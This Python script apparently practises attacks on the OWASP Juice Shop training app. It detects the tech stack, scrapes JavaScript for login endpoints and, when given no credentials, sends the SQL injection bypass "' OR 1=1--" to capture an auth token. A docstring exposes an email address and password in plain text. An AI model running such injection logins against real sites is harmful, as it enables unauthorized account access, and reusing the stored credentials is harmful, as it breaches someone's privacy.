'''
Juice shop login info:
Email: Joseph.dimartino1207@gmail.com
Password: Password1!
'''
import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re


def fetchInfo(url: str):
    s = requests.Session()
    r = s.get(url, allow_redirects=True, timeout=15)
    #print(f"[*] URL: {r.url}")
    #print(f"[*] STATUS: {r.status_code}")
    #print(f"[*] COOKIES: {s.cookies}")
    #print(f"[*] HEADERS: {s.headers}")
    #print(f"[*] HTML: {r.text}")  # there's a lot
    login_endpoints = []

    # --- Detect tech stack ---
    # print(r.headers)  # The header would usually have {"server" : "something"} or {"X-Powered-By": "something"}
    powered_by = r.headers.get("X-Powered-By", "")
    techs = []

    if "php" in powered_by.lower() or ".php" in r.text.lower():
        techs.append("PHP")
    if "express" in powered_by.lower():
        techs.append("Express (Node.js)")
    if "next.js" in powered_by.lower() or "/_next/" in r.text.lower():
        techs.append("Next.js")
    if "spring" in powered_by.lower() or ".jsp" in r.text.lower():
        techs.append("Java (Spring/JSP)")

    if techs:
        print("[*] Detected Tech:", ", ".join(techs))
    else:
        print("[*] Tech stack unknown")


    # BeautifulSoup to parse through the HTML
    soup = BeautifulSoup(r.text, "html.parser")
    script_list = [tag["src"] for tag in soup.find_all("script") if tag.get("src")]  # list of all scripts
    for script in script_list:
        full_url = urljoin(url, script)
        js = s.get(full_url).text

        API_REGEX = r"/(?:rest|api|v\d+)/[a-zA-Z0-9_/]+"

        matches = re.findall(API_REGEX, js)
        for m in matches:
            if any(word in m.lower() for word in ["login", "auth", "signin"]):
                print("[DEBUG] Candidate login endpoint:", m, "in", script)
                login_endpoints.append(m)

    return login_endpoints, s


def login(email, password, endpoints, s, base_url):
    payload = {"email": email, "password": password}
    headers = {"Content-Type": "application/json"}

    for ep in endpoints:
        url = urljoin(base_url, ep)
        r = s.post(url, json=payload, headers=headers)

        content_type = r.headers.get("Content-Type", "")
        if "application/json" in content_type:
            resp_json = r.json()
            print("[*] Got JSON:", resp_json)
        else:
            print(f"[*] Non-JSON response ({content_type}):")
            print(r.text[:200])
            continue

        if "authentication" in resp_json:
            token = resp_json["authentication"]["token"]
            print("✅ Logged in via", base_url + ep)
            return token

    print("❌ No login endpoint succeeded")
    return None


def main():
    ap = argparse.ArgumentParser(description="Juice Shop")
    ap.add_argument("base_url", help="e.g. http://localhost:3030/#/")
    ap.add_argument("--email", help="Email for login (optional)")
    ap.add_argument("--password", help="Password for login (optional)")
    args = ap.parse_args()
    BASE_URL = args.base_url

    login_endpoints, session = fetchInfo(BASE_URL)

    if args.email and args.password:
        # Normal login
        login(args.email, args.password, login_endpoints, session, BASE_URL)
    else:
        # Injection login
        print("⚡ No creds supplied, attempting SQL injection...")
        login("' OR 1=1--", "THISDOESNTMATTER123", login_endpoints, session, BASE_URL)


if __name__ == "__main__":
    main()